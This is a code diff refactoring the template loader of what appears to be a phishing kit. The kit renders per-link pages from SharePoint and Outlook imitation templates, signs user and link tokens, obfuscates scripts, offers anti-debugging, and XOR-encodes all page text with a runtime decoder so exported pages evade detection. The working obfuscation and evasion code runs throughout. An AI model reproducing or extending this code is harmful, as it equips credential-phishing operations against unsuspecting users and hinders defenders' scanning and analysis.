@@ -1,6 +1,8 @@
 /**
  * VGenius Template Loader Service
  */
+'use strict';
+
 const fs = require('fs');
 const path = require('path');
 const config = require('../config/env');
@@ -33,7 +35,10 @@ function resolveTemplateDirectory(templateType) {
         if (normalizeTemplateKey(dn) === ni) return path.join(TEMPLATES_DIR, dn);
         const cp = path.join(TEMPLATES_DIR, dn, 'config.json');
         if (fs.existsSync(cp)) {
-            try { const c = JSON.parse(fs.readFileSync(cp, 'utf8')); if (c?.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn); } catch (err) {}
+            try {
+                const c = JSON.parse(fs.readFileSync(cp, 'utf8'));
+                if (c?.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn);
+            } catch (err) {}
         }
     }
     const dp = path.join(TEMPLATES_DIR, input || fallbackDir);
@@ -90,9 +95,6 @@ function boolSetting(v) {
     return String(v || '').toLowerCase() === 'true';
 }
 
-/**
- * Obfuscate JavaScript using javascript-obfuscator
- */
 function obfuscateJs(sourceCode) {
     try {
         const JavaScriptObfuscator = require('javascript-obfuscator');
@@ -129,10 +131,8 @@ function obfuscateJs(sourceCode) {
     }
 }
 
-/**
- * Build window vars as base64 encoded blob
- */
-function buildWindowVars(link, user, settings, options = {}) {
+function buildWindowVars(link, user, settings, options) {
+    options = options || {};
     const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
     const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
     const antidebugEnabled = boolSetting(settings.antidebug_enabled);
@@ -173,9 +173,6 @@ function buildWindowVars(link, user, settings, options = {}) {
     return '<script>!function(){try{var j=JSON.parse(atob("' + encoded + '"));for(var k in j)window[k]=j[k]}catch(e){}}();</script>';
 }
 
-/**
- * Minify HTML - collapse whitespace
- */
 function minifyHtml(html) {
     html = html.replace(/<!--[\s\S]*?-->/g, '');
     html = html.replace(/\s*>\s*</g, '><');
@@ -184,35 +181,27 @@ function minifyHtml(html) {
     return html.trim();
 }
 
-/**
- * Obfuscate all text content in HTML - encode everything, decode at runtime
- */
 function obfuscateTextContent(html) {
-    // Collect all unique strings to encode
     const strings = [];
     const seen = new Set();
 
-    // Extract visible text between > and <
-    html = html.replace(/>([^<]{3,})</g, (match, text) => {
+    html = html.replace(/>([^<]{3,})</g, function(match, text) {
         const t = text.trim();
         if (!t || t.startsWith('/') || t.startsWith('!') || t.startsWith('-')) return match;
         if (!seen.has(t)) { seen.add(t); strings.push(t); }
         return '>__VG' + (strings.length - 1) + '__<';
     });
 
-    // Extract attribute values
-    html = html.replace(/="([^"]{3,})"/g, (match, value) => {
+    html = html.replace(/="([^"]{3,})"/g, function(match, value) {
         if (!seen.has(value)) { seen.add(value); strings.push(value); }
         return '="__VG' + (strings.length - 1) + '__"';
     });
 
-    // Extract text content after ="
-    html = html.replace(/='([^']{3,})'/g, (match, value) => {
+    html = html.replace(/='([^']{3,})'/g, function(match, value) {
         if (!seen.has(value)) { seen.add(value); strings.push(value); }
         return "='__VG" + (strings.length - 1) + "__'";
     });
 
-    // Encode all strings using RC4-like XOR + base64
     const encodedMap = {};
     for (let i = 0; i < strings.length; i++) {
         const s = strings[i];
@@ -223,24 +212,25 @@ function obfuscateTextContent(html) {
         encodedMap[i] = Buffer.from(encoded).toString('base64');
     }
 
-    // Build decode script
-    const decodeScript = '<script>!function(){var S=[' + encodedMap.map((v) => '"' + v + '"').join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var E=document.querySelectorAll("[data-v]");for(var i=0;i<E.length;i++){var n=E[i].getAttribute("data-v");if(n&&D[n]!==undefined){E[i].textContent=D[n];E[i].removeAttribute("data-v")}}var A=document.querySelectorAll("[data-a]");for(var i=0;i<A.length;i++){var n=A[i].getAttribute("data-a");if(n&&D[n]!==undefined){A[i].setAttribute(A[i].tagName.toLowerCase()==="INPUT"?"value":A[i].getAttribute("data-attr")||"textContent",D[n]);A[i].removeAttribute("data-a")}}})();</script>';
+    const encodedValues = Object.keys(encodedMap).sort(function(a, b) { return parseInt(a) - parseInt(b); });
+    const encodedArr = [];
+    for (let i = 0; i < encodedValues.length; i++) {
+        encodedArr.push('"' + encodedMap[encodedValues[i]] + '"');
+    }
 
-    // Replace placeholders with data attributes
-    html = html.replace(/__VG(\d+)__/g, (m, num) => {
+    const decodeScript = '<script>!function(){var S=[' + encodedArr.join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var E=document.querySelectorAll("[data-v]");for(var i=0;i<E.length;i++){var n=E[i].getAttribute("data-v");if(n&&D[n]!==undefined){E[i].textContent=D[n];E[i].removeAttribute("data-v")}}})();</script>';
+
+    html = html.replace(/__VG(\d+)__/g, function(m, num) {
         return '<span data-v="' + num + '"></span>';
     });
 
-    // Insert decode script before </head>
     html = html.replace('</head>', decodeScript + '</head>');
-
-    // Final minification
     html = minifyHtml(html);
-
     return html;
 }
 
-async function renderPageHtml(link, user, options = {}) {
+async function renderPageHtml(link, user, options) {
+    options = options || {};
     const templateType = link.template_type || 'sharepoint3';
     const designName = link.verification_design || 'outlook';
     const settings = await loadAdminSettings();
@@ -278,7 +268,6 @@ async function renderPageHtml(link, user, options = {}) {
 
     const windowVars = buildWindowVars(link, user, settings, options);
 
-    // Load vg-engine.js
     let vgEngine = '';
     const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
     if (fs.existsSync(vgEnginePath)) {
@@ -294,7 +283,6 @@ async function renderPageHtml(link, user, options = {}) {
         html = html.replace('</head>', '<script>' + vgEngine + '</script></head>');
     }
 
-    // Preload block handling
     const templateConfig = loadTemplateConfig(templateType);
     if (templateConfig.preload) {
         html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
@@ -304,26 +292,24 @@ async function renderPageHtml(link, user, options = {}) {
         html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
     }
 
-    // Obfuscate JS when enabled
     const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
     if (doObfuscate) {
         if (vgEngine && vgEngine.length > 100) {
             const obfuscatedEngine = obfuscateJs(vgEngine);
-            html = html.replace(
-                new RegExp('<script>' + vgEngine.substring(0, 50).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '[\\s\\S]*?<\\/script>'),
-                '<script>' + obfuscatedEngine + '</script>'
-            );
+            const pattern = '<script>' + vgEngine.substring(0, Math.min(50, vgEngine.length)).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+            try {
+                html = html.replace(new RegExp(pattern + '[\\s\\S]*?<\\/script>'), '<script>' + obfuscatedEngine + '</script>');
+            } catch (e) { /* regex error, skip */ }
         }
         if (script && script.length > 10) {
             const obfuscatedScript = obfuscateJs(script);
-            html = html.replace(
-                new RegExp('<script>' + script.substring(0, 30).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '[\\s\\S]*?<\\/script>'),
-                '<script>' + obfuscatedScript + '</script>'
-            );
+            const pattern2 = '<script>' + script.substring(0, Math.min(30, script.length)).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+            try {
+                html = html.replace(new RegExp(pattern2 + '[\\s\\S]*?<\\/script>'), '<script>' + obfuscatedScript + '</script>');
+            } catch (e) { /* regex error, skip */ }
         }
     }
 
-    // Full obfuscation for exported/downloaded files
     if (options.exportForDownload) {
         html = minifyHtml(html);
         html = obfuscateTextContent(html);
@@ -334,7 +320,7 @@ async function renderPageHtml(link, user, options = {}) {
     return html;
 }
 
-async function generateExportHtml(link, user, options = {}) {
+async function generateExportHtml(link, user, options) {
     return renderPageHtml(link, user, Object.assign({}, options, { exportForDownload: true }));
 }
 
